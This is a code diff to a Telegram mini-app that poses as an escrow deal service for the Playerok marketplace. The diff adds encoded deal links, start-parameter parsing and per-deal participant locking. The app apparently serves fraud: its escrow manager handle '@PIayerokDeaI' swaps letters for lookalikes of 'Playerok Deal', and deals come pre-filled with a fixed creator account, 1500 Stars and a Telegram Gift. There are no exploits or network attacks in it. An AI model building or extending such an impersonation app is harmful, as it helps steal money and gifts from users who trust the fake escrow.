@@ -311,8 +311,10 @@ body.dark .locked-banner{color:#f87171}
 <script>
 const BOT_USERNAME = '@PlayerokDealApp';
 const BOT_LINK_BASE = 'https://t.me/PlayerokDealApp';
+const APP_SHORT_NAME = ''; // Опционально: укажи short_name из /newapp у BotFather для ссылки t.me/PlayerokDealApp/<short_name>?startapp=...
 const ESCROW_MANAGER = '@PIayerokDeaI';
 const SHARED_DEALS_KEY = 'playerok_shared_deals';
+const LOCKED_DEALS_KEY = 'playerok_locked_deals';
 
 const tg = window.Telegram?.WebApp;
 if (tg) {
@@ -380,6 +382,25 @@ function loadSharedDeals() {
   }
 }
 
+function loadLockedDealsMap() {
+  try {
+    const obj = JSON.parse(localStorage.getItem(LOCKED_DEALS_KEY) || '{}');
+    return obj && typeof obj === 'object' ? obj : {};
+  } catch (e) {
+    return {};
+  }
+}
+
+function saveLockedDeal(code, participant) {
+  try {
+    const map = loadLockedDealsMap();
+    if (!map[code]) {
+      map[code] = participant;
+      localStorage.setItem(LOCKED_DEALS_KEY, JSON.stringify(map));
+    }
+  } catch (e) {}
+}
+
 function saveSharedDeal(deal) {
   try {
     const arr = loadSharedDeals().filter(x => x.code !== deal.code);
@@ -406,6 +427,9 @@ function saveSharedDeal(deal) {
       date: deal.date
     });
     localStorage.setItem(SHARED_DEALS_KEY, JSON.stringify(arr.slice(0, 50)));
+    if (deal.invitedUser) {
+      saveLockedDeal(deal.code, deal.invitedUser);
+    }
   } catch (e) {}
 }
 
@@ -469,6 +493,24 @@ function fmtFixed1(val) {
 function fmtCommaNum(val, decimals = 2) {
   const n = Number(val) || 0;
   return n.toFixed(decimals).replace('.', ',');
+}
+
+function encodePayloadB64Url(obj) {
+  const json = JSON.stringify(obj);
+  const bytes = new TextEncoder().encode(json);
+  let bin = '';
+  for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
+  return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+}
+
+function decodePayloadB64Url(str) {
+  if (!str) return null;
+  let b64 = String(str).replace(/-/g, '+').replace(/_/g, '/');
+  while (b64.length % 4) b64 += '=';
+  const bin = atob(b64);
+  const bytes = new Uint8Array(bin.length);
+  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+  return JSON.parse(new TextDecoder().decode(bytes));
 }
 
 const CUSTOM_MARKS = {
@@ -683,7 +725,30 @@ function isSameParticipant(a, b) {
 function isBuyerUser(deal) { return deal && deal.type === 'buy'; }
 function isSellerUser(deal) { return deal && deal.type === 'sell'; }
 
+function buildDealPayloadParam(d) {
+  const compact = {
+    c: d.code,
+    t: d.type || 'buy',
+    a: String(d.amount || '1500'),
+    cur: d.currency || 'STARS',
+    i: (d.itemName || 'Telegram Gift').slice(0, 48),
+    desc: (d.description || '').slice(0, 140),
+    by: d.creatorHandle || '@opiem',
+    byId: String(d.creatorId || '8922046082'),
+    dt: d.date || ''
+  };
+  try {
+    const encoded = encodePayloadB64Url(compact);
+    if (encoded.length <= 240) return `deal_${encoded}`;
+  } catch (e) {}
+  return `deal_${d.code}`;
+}
+
 function buildSellerStartLink(d) {
+  const param = buildDealPayloadParam(d);
+  if (APP_SHORT_NAME) {
+    return `${BOT_LINK_BASE}/${APP_SHORT_NAME}?startapp=${encodeURIComponent(param)}`;
+  }
   return `${BOT_LINK_BASE}?start=deal_${d.code}`;
 }
 
@@ -1401,26 +1466,62 @@ function openTransactions() {
 }
 
 function extractStartParam() {
-  const tgStart = tg?.initDataUnsafe?.start_param;
-  if (tgStart && String(tgStart).trim()) return String(tgStart).trim();
+  const candidates = [];
+  if (tg?.initDataUnsafe?.start_param) candidates.push(String(tg.initDataUnsafe.start_param).trim());
+  if (tg?.initData) {
+    const mInit = String(tg.initData).match(/(?:^|&)start_param=([^&]+)/);
+    if (mInit) candidates.push(decodeURIComponent(mInit[1]).trim());
+  }
   const params = new URLSearchParams(window.location.search);
-  const qStart = params.get('startapp') || params.get('start') || params.get('tgWebAppStartParam') || '';
-  if (qStart.trim()) return qStart.trim();
+  for (const k of ['startapp', 'start', 'tgWebAppStartParam']) {
+    const v = params.get(k);
+    if (v && v.trim()) candidates.push(v.trim());
+  }
   const hash = window.location.hash || '';
-  const m = hash.match(/(?:tgWebAppStartParam|startapp|start)=([^&]+)/);
-  return m ? decodeURIComponent(m[1]).trim() : '';
+  const mHash = hash.match(/(?:tgWebAppStartParam|startapp|start)=([^&]+)/);
+  if (mHash && mHash[1]) candidates.push(decodeURIComponent(mHash[1]).trim());
+  return candidates.find(Boolean) || '';
+}
+
+function parseStartDealPayload(rawParam) {
+  const cleaned = String(rawParam || '').trim();
+  if (!cleaned) return null;
+  const body = cleaned.replace(/^deal_/i, '').split('.')[0].trim();
+  if (!body) return null;
+  if (/^[A-Za-z0-9_-]{16,}$/.test(body)) {
+    try {
+      const decoded = decodePayloadB64Url(body);
+      if (decoded && decoded.c) {
+        return {
+          code: String(decoded.c),
+          type: decoded.t === 'sell' ? 'sell' : 'buy',
+          amount: String(decoded.a || '1500'),
+          currency: String(decoded.cur || 'STARS').toUpperCase(),
+          itemName: String(decoded.i || 'Telegram Gift'),
+          description: String(decoded.desc || decoded.i || 't.me/nft/Gift-1'),
+          creatorHandle: String(decoded.by || '@opiem'),
+          creatorId: String(decoded.byId || '8922046082'),
+          date: String(decoded.dt || '')
+        };
+      }
+    } catch (e) {}
+  }
+  return { code: body };
 }
 
 function handleStartParam() {
   const rawParam = extractStartParam();
   if (!rawParam) return;
-  const code = rawParam.replace(/^deal_/i, '').split('.')[0].trim();
-  if (!code) return;
+  const parsed = parseStartDealPayload(rawParam);
+  if (!parsed || !parsed.code) return;
+  const code = parsed.code;
 
   accessBannerMsg = '';
   const shared = loadSharedDeals().find(x => x.code === code);
+  const lockedMap = loadLockedDealsMap();
   let found = state.deals.find(d => d.code === code);
-  const source = found || shared || { code };
+  const source = { ...(shared || {}), ...parsed, ...(found || {}) };
+  source.code = code;
 
   const viewer = getCurrentViewerInfo();
   const creatorHandle = source.creatorHandle || '@opiem';
@@ -1437,7 +1538,7 @@ function handleStartParam() {
   const fee = source.fee != null ? source.fee : Number((baseNum * 0.01).toFixed(2));
   const totalAmount = source.totalAmount != null ? source.totalAmount : Number((baseNum + fee).toFixed(2));
 
-  const existingSeller = source.invitedUser || (source.lockedUserId || source.lockedUserHandle ? {
+  const existingSeller = source.invitedUser || lockedMap[code] || (source.lockedUserId || source.lockedUserHandle ? {
     id: source.lockedUserId || '',
     handle: source.lockedUserHandle || '@seller',
     label: source.lockedUserHandle || '@seller',
@@ -1465,6 +1566,7 @@ function handleStartParam() {
         joinedAt: new Date().toLocaleString('ru-RU')
       });
 
+  saveLockedDeal(code, participantInfo);
   const isSellerSide = !isCreator && isSameParticipant(participantInfo, viewer);
 
   if (!found) {
@@ -1533,4 +1635,4 @@ if (!state.languageChosen && !extractStartParam()) {
 handleStartParam();
 </script>
 </body>
-  </html>
+</html>
